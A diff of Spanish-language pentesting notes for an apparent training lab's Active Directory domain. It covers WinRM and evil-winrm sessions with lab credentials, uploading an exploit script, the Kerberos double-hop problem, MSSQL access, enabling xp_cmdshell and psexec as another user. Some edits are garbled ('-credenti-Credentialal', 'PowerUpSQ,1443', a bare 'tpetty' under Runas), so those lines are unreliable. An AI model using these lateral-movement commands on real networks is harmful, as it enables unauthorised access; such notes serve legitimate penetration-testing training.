@@ -38,12 +38,23 @@ Nos planteamos este escenario cuando somos un usuario sin privilegios administra
 ### Estableciendo sesión
 - Windows
 	```powershell
-		$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -ForcePS $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password) Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+		$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -ForcePS $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password) 
+		Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
 	```
+-  Para subir/descargar archivos en una sesión `evil-winrm`
+	- Subir archivos
+		```powershell
+		upload /home/user/scripts/exploit.ps1 C:\Users\Administrador\Desktop\exploit.ps1
+		```
+	- Descargar archivos
+		```
+		download C:\ruta\archivo.txt /ruta/local/archivo.txt
+		```
 - Linux
 	```bash
 	evil-winrm -i $target -u <username>
 	```
+
 
 ### Estableciendo sesión - problema del double Hop
 Dado que en WinRM obteenmos un ticket TGS, no podemos ejecutar algunos comandos que involucran comunicarse con otros hosts. Ejemplo:
@@ -61,7 +72,7 @@ $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\backupadm', $SecPassword)
 ```
 
-Ahora, si intentamos ejecutar comandos que involucren servicios con autenticación delegada e incluimos la flag `-credential $Cred` , podremos acceder a estos servicios:
+Ahora, si intentamos ejecutar comandos que involucren servicios con autenticación delegada e incluimos la flag `-credenti-Credentialal $Cred` , podremos acceder a estos servicios:
 ```powershell
 get-domainuser -spn -credential $Cred | select samaccountname
 ```
@@ -80,7 +91,7 @@ Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\\backupadm -Config
 	```cypher
 	MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
 	```
-### PowerUpSQL
+### PowerUpSQ,1443
 - [Chuleta interesante](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
 - Enumerando instancias de MSSQL    
     ```powershell
@@ -94,7 +105,10 @@ Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\\backupadm -Config
     ```
 - Autenticando sobre una instancia MSSQL - Linux
     ```bash
-    mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+    #Con credenciales Windows
+    mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth 
+    #Con credenciales mssql
+    mssqlclient.py INLANEFREIGHT/netdb@172.16.7.60
     ```
 - Una vez autenticados
 	- Seleccionando  **enable_xp_cmdshell**
@@ -106,3 +120,15 @@ Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\\backupadm -Config
 	    ```bash
 	    xp_cmdshell whoami /priv
 	    ```
+
+## Obtener PS como otro usuario - Windows
+### Runas
+```powershell
+tpetty
+```
+### psexec
+- Ejecutar ps como otro usuario
+	```powershell
+	psexec.exe -u DOMAIN\Username -p Password powershell.exe
+	```
+
